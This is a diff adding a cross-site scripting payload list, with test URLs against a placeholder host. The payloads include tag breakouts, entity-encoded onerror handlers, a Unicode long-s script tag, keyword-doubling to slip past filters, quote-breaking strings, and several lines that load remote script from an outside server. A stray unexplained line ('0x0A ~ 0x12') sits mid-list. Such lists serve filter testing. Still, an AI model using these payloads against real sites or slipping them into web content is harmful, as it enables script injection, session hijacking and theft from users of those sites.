@@ -1,0 +1,20 @@
+- http://xss.test/?input=<script>alert(1)</script>
+- http://xss.test/?input=</textarea><script>alert(1)</script>
+- http://xss.test/?input=">><script>alert(1)</script>
+- http://xss.test/?input=">><script>alert`1`</script>
+- http://xss.test/?input=<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+- http://xss.test/?input=asdasd --!><img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+- http://xss.test/?input=type="images" onclick=alert(1)
+- http://xss.test/?input=<svg onload=alert(1)//
+- http://xss.test/?input=</style ><script>alert(1)</script>
+- http://xss.test/?input=https://www.segmentfault.com@html5sec.org/test.js
+0x0A ~ 0x12
+- http://xss.test/?input=https://www.segmentfault.com@html5sec.org/test.js
+- http://xss.test/?input=<script src="https://server.n0tr00t.com/t.js"></script>
+- http://xss.test/?input=<scrscriptipt/**/src="https://server.n0tr00t.com/t.js"></scscriptript>
+- http://xss.test/?input=alert(1)-->
+- http://xss.test/?input=<ſcript src=https://server.n0tr00t.com/t.js></script>
+- http://xss.test/?input=\\');alert('1
+- http://xss.test/?input=alert(1);
+- http://xss.test/?input=asd");alert("1
+- http://xss.test/?input=</script><script>alert(1)</script>
